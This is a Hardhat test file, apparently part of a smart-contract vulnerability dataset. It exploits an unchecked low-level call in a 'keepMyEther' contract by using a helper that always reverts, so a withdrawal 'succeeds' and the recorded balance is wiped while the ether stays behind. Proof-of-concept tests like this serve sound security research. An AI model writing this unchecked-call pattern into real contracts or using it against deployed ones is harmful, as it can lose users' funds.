const { loadFixture } = require('@nomicfoundation/hardhat-network-helpers');
const { expect } = require('chai');

describe("attack unchecked_low_level_calls/0xb7c5c5aa4d42967efe906e1b66cb8df9cebf04f7.sol", function () {

  let owner;

  async function deployContracts() {
    [owner] = await ethers.getSigners();
    const keepMyEther = await ethers.getContractFactory("contracts/dataset/unchecked_low_level_calls/0xb7c5c5aa4d42967efe906e1b66cb8df9cebf04f7.sol:keepMyEther");
    const contract = await keepMyEther.connect(owner).deploy();

    const RevertContract = await ethers.getContractFactory("contracts/unchecked_low_level_calls/revert_contract.sol:RevertContract");
    const revertContract = await RevertContract.deploy();

    return {contract, revertContract}
  };

  it("exploit unchecked low level call vulnerability", async function () {
    const {contract, revertContract} = await loadFixture(deployContracts);
    expect(await ethers.provider.getBalance(contract.target)).to.be.equal(0);
    expect(await ethers.provider.getBalance(revertContract.target)).to.be.equal(0);
    const amount = ethers.parseEther("1");
    await expect(
      owner.sendTransaction({
        to: revertContract.target,
        value: amount,
      })
    ).to.be.revertedWith("I always revert!");

    await revertContract.sendEther(contract.target, {value: amount});

    expect(await ethers.provider.getBalance(contract.target)).to.be.equal(amount);
    expect(await contract.balances(revertContract.target)).to.be.equal(amount);

    await expect(revertContract.withdrawEther(contract.target)).to.not.be.reverted;

    expect(await ethers.provider.getBalance(contract.target)).to.be.equal(amount);

    expect(await ethers.provider.getBalance(revertContract.target)).to.be.equal(0);

    expect(await contract.balances(revertContract.target)).to.be.equal(0);

  });
});
